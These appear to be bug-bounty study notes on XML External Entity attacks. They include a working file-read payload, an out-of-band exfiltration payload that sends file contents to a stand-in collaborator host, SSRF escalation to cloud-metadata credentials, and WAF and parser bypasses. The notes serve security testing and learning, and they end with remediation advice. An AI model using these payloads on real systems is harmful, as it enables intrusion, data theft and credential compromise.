# Ch15: XML External Entities

Source: Chapter 15. XXE = the XML parser resolves attacker-defined **entities**, incl. *external* entities that fetch files/URLs. Root cause: DTD processing enabled + unsafe parser defaults.

## XML/entity primer for testing

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
```

- `&xxe;` inside the doc is replaced by `/etc/passwd` content → response shows file → classic XXE.
- External-entity destinations: `file:///etc/passwd`, `file:///var/www/config.php`, `php://filter/convert.base64-encode/resource=index.php` (read source as b64, defeats `<?php` parse errors), `http://169.254.169.254/…` (XXE→SSRF→metadata).

## Hunting

- Any endpoint accepting XML: SOAP services, SAML POSTs, file uploads (`.xml`, `.svg`, `.docx`, `.xlsx` — Office docs are zipped XML), RSS import, `Content-Type: application/xml` APIs, XML config uploads.
- Non-obvious: change `Content-Type` of a JSON/form request to `application/xml` and send XML — some frameworks auto-parse.
- **Blind XXE** (no entity reflection): **parameter entities + OOB exfil**:

```xml
<!DOCTYPE r [ <!ENTITY % ext SYSTEM "http://COLLAB/?x=%file;"> %ext; ]>
```

Wrap the file read in a parameter entity → fetch attacker DTD → exfiltrate via DNS/HTTP request. Burp Collaborator/interactsh confirms with zero output in-app.
- **Error-based**: force file content into an error message when direct reflection fails.

## Escalation

- Read config/keys (`/etc/passwd`, web.xml, `application.properties`, `.env` paths from recon) → creds → lateral.
- SSRF chain: XXE → internal HTTP → cloud metadata → IAM creds.
- DoS variants (`billion laughs` entity expansion) — prove concept only, don't run at scale.

## Bypasses

- Parser blocks `file://` → `php://filter`, `jar://`, `netdoc://`, expect:// (where supported).
- WAF keyword checks → UTF-16/UTF-7 encoded XML, entity name obfuscation, whitespace tricks.
- Only CDATA/data allowed → `&`-entity inside CDATA wrappers, XInclude (`<xi:include href="file:///…">`) when DTDs are disabled.

## First-bug checklist

Find XML input → inject `&xxe;` file read → no reflection? → parameter-entity OOB → escalate to SSRF/secrets → remediation note (disable DTDs/external entities, use JSON).
